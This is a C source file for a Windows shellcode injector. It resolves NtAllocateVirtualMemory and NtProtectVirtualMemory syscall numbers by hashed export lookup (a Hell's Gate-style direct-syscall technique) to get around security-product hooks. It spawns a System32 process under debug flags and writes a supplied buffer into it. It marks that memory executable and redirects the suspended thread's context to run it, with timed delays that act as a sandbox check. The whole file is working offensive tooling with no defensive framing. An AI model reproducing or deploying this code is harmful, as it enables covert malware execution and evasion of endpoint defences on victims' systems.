#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "structs.h"

 //----------------------------------------------------------------------------------------------------------

#ifdef _M_X64
#define SET_REG(ctx, value) ctx.Rcx = (DWORD64)value
#else
#define SET_REG(ctx, value) ctx.Eax = (DWORD)value
#endif
 

 //----------------------------------------------------------------------------------------------------------


#define msDelaynumber  10000
int Delay_Exec(int number);


//----------------------------------------------------------------------------------------------------------

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

//----------------------------------------------------------------------------------------------------------

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
} VX_TABLE, * PVX_TABLE;

//----------------------------------------------------------------------------------------------------------

PTEB RtlGetThreadEnvironmentBlock();

//----------------------------------------------------------------------------------------------------------

BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);

//----------------------------------------------------------------------------------------------------------

BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);

//----------------------------------------------------------------------------------------------------------

PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

//----------------------------------------------------------------------------------------------------------


PTEB RtlGetThreadEnvironmentBlock() {
	return (PTEB)__readgsqword(0x30);
}

//----------------------------------------------------------------------------------------------------------

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

//----------------------------------------------------------------------------------------------------------

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {

	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

//----------------------------------------------------------------------------------------------------------

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2((PBYTE)pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;


			WORD cw = 0;
			while (TRUE) {

				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;


				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

//----------------------------------------------------------------------------------------------------------

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = (char*)dest;
	char* s = (char*)src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

//----------------------------------------------------------------------------------------------------------

extern void Allocate(WORD wSystemCall);
extern int RunAllocated();

//----------------------------------------------------------------------------------------------------------


void inject_process(HANDLE hProcess, LPCVOID buffer, SIZE_T length, int pid, HANDLE hThread, PVX_TABLE pVxTable) {
	PVOID ptr = NULL; 
	NTSTATUS Status;
	SIZE_T wrote;
	DWORD  old;

	
	//printf("[+] Running VirtualAllocEx ....");
	//ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length + 128, MEM_COMMIT, PAGE_READWRITE);
	//if (ptr == NULL) {
	//	printf("failed \n");
	//	return;
	//}
	//printf(" [ + ] DONE \n");

	printf("[+] Running NtAllocateVirtualMemory ....");
	Allocate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	Status = RunAllocated(hProcess, &ptr, 0, &length + 128, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf(" [ + ] DONE \n");

	Delay_Exec(msDelaynumber);

	//printf("[+] Running WriteProcessMemory ....");
	//WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T*)&wrote);
	//printf(" [ + ] DONE \n");

	printf("[+] Running NtWriteVirtualMemory ....");
	Status = NtWriteVirtualMemory(hProcess, ptr, (PVOID)buffer, length, NULL);
	printf(" [ + ] DONE \n");


	


    printf("[+] Running NtProtectVirtualMemory ....");
    Allocate(pVxTable->NtProtectVirtualMemory.wSystemCall);
    Status = RunAllocated(hProcess, &ptr, &length, PAGE_EXECUTE_READWRITE, &old);
	printf(" [ + ] DONE \n");


	
	//printf("[+] Running NtCreateThreadEx ...");
	//HANDLE thread = NULL;
	//Status = NtCreateThreadEx(
	//	&thread,
	//	THREAD_ALL_ACCESS,
	//	NULL,
	//	hProcess,
	//	(LPTHREAD_START_ROUTINE)ptr,
	//	NULL,
	//	NULL,
	//	NULL,
	//	NULL,
	//	NULL,
	//	NULL
	//);
	//printf(" [ + ] DONE \n");

	Delay_Exec(msDelaynumber);

	CONTEXT ctx;
	printf("[+] GetThreadContext ...");
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(hThread, &ctx)) {
		printf("failed \n");
		return;

	}	
	printf(" [ + ] DONE \n");


	printf("[+] SetThreadContext ...");
	SET_REG(ctx, ptr);
	if (!SetThreadContext(hThread, &ctx)) {
		printf("failed \n");
		return;

	}
	printf(" [ + ] DONE \n");
	

	printf("[+] ResumeThread ...");
	ResumeThread(hThread);
	printf(" [ + ] DONE \n");


	Delay_Exec(msDelaynumber);

	DebugActiveProcessStop(pid);
	printf("[+] Debugging is DONE \n");
	
}



int inject(LPCVOID buffer, int length, char* processname) {
	
	
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hProcess = NULL;
	char lbuffer[1024];
	char cmdbuff[1024];

	if (processname == NULL || strlen(processname) == 0) {
		hProcess = GetCurrentProcess();
	}
	else {
		
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		
		GetEnvironmentVariableA("windir", lbuffer, 1024);

		
		_snprintf(cmdbuff, 1024, "%s\\System32\\%s", lbuffer, processname);

		if (!CreateProcessA(
			NULL,
			cmdbuff,
			NULL,
			NULL,
			TRUE,
			IDLE_PRIORITY_CLASS | CREATE_SEPARATE_WOW_VDM | DEBUG_PROCESS| DETACHED_PROCESS,
			NULL,
			NULL, 
			(LPSTARTUPINFOA)&si, 
			&pi)
			) {

			printf("[!] CreateProcessA failed \n");
			return -1;
		}
		hProcess = pi.hProcess;
	}

	Delay_Exec(msDelaynumber);
	
	int pid = pi.dwProcessId; 
	HANDLE hThread = pi.hThread;


	if (GetThreadPriority(hThread) <= 0) {

		printf("[!] Thread is with low Priority\n");

		SetThreadPriority(
			hThread,
			THREAD_PRIORITY_TIME_CRITICAL
		);

		if (GetThreadPriority(hThread) != 15) {
			printf("[-] Failed in making the thread time critical \n");
		}
		else {
			printf("[+] Thread is time critical \n");
		}
	}


	if (!hProcess) {
		printf("[!] process handle failed\n");
		return -1;
	}
	else {
		printf("[+] process handler is set with pid: %d\n", pid);
	}

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	VX_TABLE Table = { 0 };

	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL) {
		return -1;
	}
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory)) {
		return -1;
	}

	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory)) {
		return -1;
	}

	Delay_Exec(msDelaynumber);

	inject_process(hProcess, buffer, length, pid, hThread, &Table);
}



int Delay_Exec(int number) {
	printf("[+] Running Delay Execution for %d ... \n", number);
	ULONGLONG uptimeBeforeSleep = GetTickCount64();
	typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
	PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
	LARGE_INTEGER delay;
	delay.QuadPart = -10000 * number;
	pNtDelayExecution(FALSE, &delay);
	ULONGLONG uptimeAfterSleep = GetTickCount64();
	if ((uptimeAfterSleep - uptimeBeforeSleep) < number) {
		printf("[!] Delay Execution Failed ! \n");
		return -1;
	}
	else {
		printf("[+] DONE ! \n");
	}
}